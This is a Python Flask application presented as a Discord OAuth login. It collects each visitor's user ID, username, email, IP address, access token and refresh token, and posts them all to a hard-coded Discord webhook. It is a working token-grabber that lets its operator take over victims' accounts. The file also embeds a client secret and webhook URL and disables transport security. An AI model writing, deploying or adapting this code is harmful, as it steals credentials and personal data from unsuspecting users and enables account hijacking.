from requests_oauthlib import OAuth2Session
from flask import Flask, request, redirect, session, render_template, url_for
import os
import requests
import random
import string

os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

base_discord_api_url = 'https://discordapp.com/api'
client_id = '1178048620939972798'
client_secret = "84mKESgz8NKl-wvDb8i5UGP-_b3WqQgs"
redirect_uri = 'https://flask-production-6a75.up.railway.app/oauth_callback'
scope = ['identify', 'email', 'connections']
token_url = 'https://discordapp.com/api/oauth2/token'
authorize_url = 'https://discordapp.com/api/oauth2/authorize'

app = Flask(__name__)
app.secret_key = os.urandom(24)

def generate_state():
    state_length = 24
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(state_length))

def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, color="#00FF00"):
    embed = {
        'title': 'Discord OAuth Data',
        'color': int(color.lstrip("#"), 16),
        'fields': [
            {'name': 'User ID', 'value': str(user_id), 'inline': True},
            {'name': 'Username', 'value': profile_data['username'], 'inline': True},
            {'name': 'Email', 'value': profile_data['email'], 'inline': True},
            {'name': 'Access Token', 'value': access_token, 'inline': True},
            {'name': 'Refresh Token', 'value': refresh_token, 'inline': True},
            {'name': 'User IP', 'value': user_ip, 'inline': True}
        ]
    }
    return embed

@app.route("/")
def home():
    state = generate_state()
    session['state'] = state

    oauth = OAuth2Session(client_id, redirect_uri=redirect_uri, scope=scope, state=state)
    login_url, _ = oauth.authorization_url(authorize_url)

    print("Generated state:", state)
    print("Login url:", login_url)
    return render_template('index.html')

@app.route("/oauth_callback")
def oauth_callback():
    try:
        if 'state' not in request.args:
            print("Callback state:", "Not present")
            return 'Invalid callback. Missing state parameter.'

        if request.args['state'] != session.get('state'):
            print("Received state:", request.args['state'])
            print("Stored state:", session.get('state'))
            return 'Invalid callback. State mismatch.'

        discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
        token = discord.fetch_token(
            token_url,
            client_secret=client_secret,
            authorization_response=request.url,
        )

        session['discord_token'] = token
        response = discord.get(base_discord_api_url + '/users/@me')
        user_id = response.json()['id']
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'  # Bu adresi kendi projenizdeki gerçek adresle değiştirin

        profile_data = response.json()
        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")

        data = {'embeds': [embed]}
        response = requests.post(webhook_url, json=data)

        if response.status_code == 200:
            print("Webhook request successful")
        else:
            print(f"Webhook request failed with status code {response.status_code}")
            print(response.text)

        return 'Authentication successful. Your data has been sent to the webhook.'

    except Exception as e:
        print(f"An error occurred: {e}")
        return f'An error occurred during authentication. Details: {e}'

@app.route("/profile")
def profile():
    if 'discord_token' not in session:
        return 'You are not logged in. Please <a href="/">login with Discord</a> first.'
    discord = OAuth2Session(client_id, token=session['discord_token'])
    response = discord.get(base_discord_api_url + '/users/@me')
    user_id = response.json()['id']
    return 'Profile: %s' % user_id

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7766)
